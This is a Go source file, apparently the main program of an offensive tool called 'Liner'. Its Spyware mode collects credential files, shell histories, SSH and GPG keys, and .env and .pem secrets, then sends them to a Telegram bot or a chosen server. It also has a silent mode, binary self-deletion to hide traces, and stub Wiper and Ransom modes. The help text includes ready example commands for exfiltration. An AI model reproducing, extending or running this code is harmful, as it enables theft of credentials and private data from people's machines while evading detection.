package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
	
	"github.com/Nowafen/liner/core"
)

// ANSI color codes
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorWhite  = "\033[37;1m"
)

// Current version
const CurrentVersion = "1.1"

// checkVersion checks if a newer version is available
func checkVersion() (string, bool) {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://github.com/Nowafen/liner/raw/main/payloads/version")
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", false
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", false
	}

	remoteVersion := strings.TrimSpace(string(body))
	return remoteVersion, remoteVersion > CurrentVersion
}

func printVersion() {
	fmt.Printf("%sLiner version: %s%s\n", ColorWhite, CurrentVersion, ColorReset)
	if _, newerAvailable := checkVersion(); newerAvailable {
		fmt.Printf("%s[WARNING]%s You can download the latest version. Current version: %s. Run `liner --update` to update.%s\n",
			ColorYellow, ColorWhite, CurrentVersion, ColorReset)
	}
}

func updateTool() {
	remoteVersion, newerAvailable := checkVersion()
	if !newerAvailable {
		fmt.Printf("%s[INFO]%s You are already on the latest version: %s%s\n",
			ColorGreen, ColorWhite, CurrentVersion, ColorReset)
		return
	}

	fmt.Printf("%s[INFO]%s Updating to the latest version...%s\n", ColorGreen, ColorWhite, ColorReset)
	cmd := exec.Command("go", "install", "github.com/Nowafen/liner/cmd@latest")
	if output, err := cmd.CombinedOutput(); err != nil {
		fmt.Printf("%s[ERROR]%s Failed to update: %v, output: %s%s\n",
			ColorRed, ColorWhite, err, string(output), ColorReset)
		os.Exit(1)
	}

	fmt.Printf("%s[INFO]%s Successfully updated to version %s%s\n",
		ColorGreen, ColorWhite, remoteVersion, ColorReset)
}

func printShortHelp() {
	fmt.Printf("%sUsage: liner --mode <MODE> --dump <DUMP> {--telegram --token <TOKEN> --id <ID> | -s <IP> -p <PORT>} [options]%s\n\n", ColorWhite, ColorReset)
	fmt.Printf("%sRequired flags:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --mode        Operation mode (Spyware, Vayper, Ransom)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --dump        Data to dump (Credentials, Password, Session, privateDATA, all)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --telegram    Use Telegram for data transfer%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --token       Telegram bot token (required with --telegram)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --id          Telegram chat ID (required with --telegram)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  -s, --server  Server IP or hostname (required if --telegram is not used)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  -p, --port    Server port (required with --server)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%sOptional flags:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --silent      Run in silent mode (no output)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --version     Show current version%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --update      Update tool to the latest version%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  -e, --encryption  Use TLS for server (yes/no, default: yes)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  -h, --help    Show this help message or full guide with examples%s\n\n", ColorWhite, ColorReset)
	fmt.Printf("%sNote: Use --help for a detailed guide with examples.%s\n", ColorWhite, ColorReset)
	if _, newerAvailable := checkVersion(); newerAvailable {
		fmt.Printf("%s[WARNING]%s A newer version is available! Current version: %s. Run `liner --update` to download the latest version.%s\n",
			ColorYellow, ColorWhite, CurrentVersion, ColorReset)
	}
}

func printFullHelp() {
	fmt.Printf("%sLiner - A data collection and transfer tool (Version %s)%s\n\n", ColorWhite, CurrentVersion, ColorReset)
	fmt.Printf("%sUsage: liner --mode <MODE> --dump <DUMP> {--telegram --token <TOKEN> --id <ID> | -s <IP> -p <PORT>} [options]%s\n\n", ColorWhite, ColorReset)
	fmt.Printf("%sRequired flags:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --mode <MODE>          Operation mode of the tool%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         Valid options: Spyware, Vayper, Ransom%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         - Spyware: Collects and sends specified data%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         - Vayper: Not yet implemented%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         - Ransom: Not yet implemented%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --dump <DUMP>          Type of data to collect (for Spyware mode)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         Valid options: Credentials, Password, Session, privateDATA, all%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         - Credentials: Collects files like .git-credentials, .config/keyring%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         - Password: Collects files like .bash_history, .zsh_history%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         - Session: Collects files like .ssh/authorized_keys, .gnupg/pubring.kbx%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         - privateDATA: Collects sensitive files (*.env, *.pem, etc.)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s                         - all: Collects all of the above%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --telegram             Use Telegram for data transfer%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --token <TOKEN>        Telegram bot token (required with --telegram)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --id <ID>              Telegram chat ID (required with --telegram)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  -s, --server <IP>      Server IP or hostname (required if --telegram is not used)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  -p, --port <PORT>      Server port (required with --server)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%sOptional flags:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --silent               Run in silent mode (suppresses console output)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --version              Display the current version of the tool%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --update               Update the tool to the latest version%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  -e, --encryption <MODE>  Use TLS for server (yes/no, default: yes)%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  -h                     Show brief help message%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --help                 Show this detailed guide%s\n\n", ColorWhite, ColorReset)
	fmt.Printf("%sExamples:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  Run Spyware mode to collect all data and send to Telegram:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s    liner --mode Spyware --dump Password --telegram --token {Value} --id {Value}%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  Run Spyware mode to collect all data and send to server:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s    liner --mode Spyware --dump all -s example.com -p 8080 -e yes%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  Run in silent mode with server:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s    liner --mode Spyware --dump Credentials -s example.com -p 8080 --silent%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  Check tool version:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s    liner --version%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  Update the tool:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s    liner --update%s\n\n", ColorWhite, ColorReset)
	fmt.Printf("%sNote: Ensure you have `zip`, `coreutils`, and `tree` installed (`sudo apt install zip coreutils tree`).%s\n", ColorWhite, ColorReset)
	if _, newerAvailable := checkVersion(); newerAvailable {
		fmt.Printf("%s[WARNING]%s A newer version is available! Current version: %s. Run `liner --update` to download the latest version.%s\n",
			ColorYellow, ColorWhite, CurrentVersion, ColorReset)
	}
}

func main() {
	// Define CLI flags
	mode := flag.String("mode", "", "Operation mode (Spyware, Vayper, Ransom)")
	dump := flag.String("dump", "", "Data to dump (Credentials, Password, Session, privateDATA, all)")
	telegram := flag.Bool("telegram", false, "Use Telegram for data transfer")
	token := flag.String("token", "", "Telegram bot token")
	chatID := flag.String("id", "", "Telegram chat ID")
	server := flag.String("server", "", "Server IP or hostname")
	port := flag.String("port", "", "Server port")
	encryption := flag.String("encryption", "yes", "Use TLS for server (yes/no)")
	silent := flag.Bool("silent", false, "Run in silent mode (no output)")
	version := flag.Bool("version", false, "Show current version")
	update := flag.Bool("update", false, "Update tool to the latest version")
	help := flag.Bool("help", false, "Show detailed help with examples")
	flag.Parse()

	// Check for version flag
	if *version {
		printVersion()
		return
	}

	// Check for update flag
	if *update {
		if flag.NFlag() > 1 {
			fmt.Printf("%s[ERROR]%s --update must be used alone%s\n", ColorRed, ColorWhite, ColorReset)
			os.Exit(1)
		}
		updateTool()
		return
	}

	// Check for help flags
	if *help || (len(os.Args) == 2 && (os.Args[1] == "-h" || os.Args[1] == "--help")) {
		if *help {
			printFullHelp()
		} else {
			printShortHelp()
		}
		return
	}

	// Validate flag prefix (force -- instead of -)
	for _, arg := range os.Args[1:] {
		if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") && arg != "-h" && arg != "-s" && arg != "-p" && arg != "-e" {
			fmt.Printf("%s[ERROR]%s Flags must use -- prefix (e.g., --mode instead of -mode)%s\n",
				ColorRed, ColorWhite, ColorReset)
			printShortHelp()
			os.Exit(1)
		}
	}

	// Validate required flags
	if *mode == "" {
		fmt.Printf("%s[ERROR]%s --mode is required%s\n", ColorRed, ColorWhite, ColorReset)
		printShortHelp()
		os.Exit(1)
	}

	// Validate Spyware mode specific flags
	if *mode == "Spyware" {
		if *dump == "" {
			fmt.Printf("%s[ERROR]%s --dump is required for Spyware mode%s\n",
				ColorRed, ColorWhite, ColorReset)
			os.Exit(1)
		}
		if !*telegram && (*server == "" || *port == "") {
			fmt.Printf("%s[ERROR]%s --server and --port are required if --telegram is not used%s\n",
				ColorRed, ColorWhite, ColorReset)
			printShortHelp()
			os.Exit(1)
		}
		if *telegram && (*token == "" || *chatID == "") {
			fmt.Printf("%s[ERROR]%s --token and --id are required with --telegram%s\n",
				ColorRed, ColorWhite, ColorReset)
			printShortHelp()
			os.Exit(1)
		}
		if *telegram && *server != "" {
			fmt.Printf("%s[ERROR]%s Cannot use --telegram and --server together%s\n",
				ColorRed, ColorWhite, ColorReset)
			printShortHelp()
			os.Exit(1)
		}
		if *encryption != "yes" && *encryption != "no" {
			fmt.Printf("%s[ERROR]%s --encryption must be 'yes' or 'no'%s\n",
				ColorRed, ColorWhite, ColorReset)
			printShortHelp()
			os.Exit(1)
		}
	}

	// Handle modes
	switch *mode {
	case "Spyware":
		var err error
		if *telegram {
			err = core.Spyware(*dump, *token, *chatID, *silent)
		} else {
			err = core.SpywareServer(*dump, *server, *port, *encryption, *silent)
		}
		if err != nil {
			if !*silent {
				fmt.Printf("%s[WARNING]%s Error running Spyware: %v%s\n",
					ColorYellow, ColorWhite, err, ColorReset)
			}
		}
		if !*silent {
			fmt.Printf("%s[INFO]%s Spyware operation completed%s\n",
				ColorGreen, ColorWhite, ColorReset)
		}
	case "Vayper":
		fmt.Printf("%s[ERROR]%s Vayper mode is not yet implemented%s\n",
			ColorRed, ColorWhite, ColorReset)
		os.Exit(1)
	case "Ransom":
		fmt.Printf("%s[ERROR]%s Ransom mode is not yet implemented%s\n",
			ColorRed, ColorWhite, ColorReset)
		os.Exit(1)
	default:
		fmt.Printf("%s[ERROR]%s Invalid mode. Use: Spyware, Vayper, or Ransom%s\n",
			ColorRed, ColorWhite, ColorReset)
		os.Exit(1)
	}

	// Self-delete using which liner
	cmd := exec.Command("which", "liner")
	output, err := cmd.Output()
	if err == nil {
		binaryPath := strings.TrimSpace(string(output))
		if binaryPath != "" {
			if err := os.Remove(binaryPath); err != nil && !*silent {
				fmt.Printf("%s[WARNING]%s Failed to delete binary at %s: %v%s\n",
					ColorYellow, ColorWhite, binaryPath, err, ColorReset)
			}
		}
	} else {
		// Fallback to os.Args[0]
		if err := os.Remove(os.Args[0]); err != nil && !*silent {
			fmt.Printf("%s[WARNING]%s Failed to delete binary at %s: %v%s\n",
				ColorYellow, ColorWhite, os.Args[0], err, ColorReset)
		}
	}
}
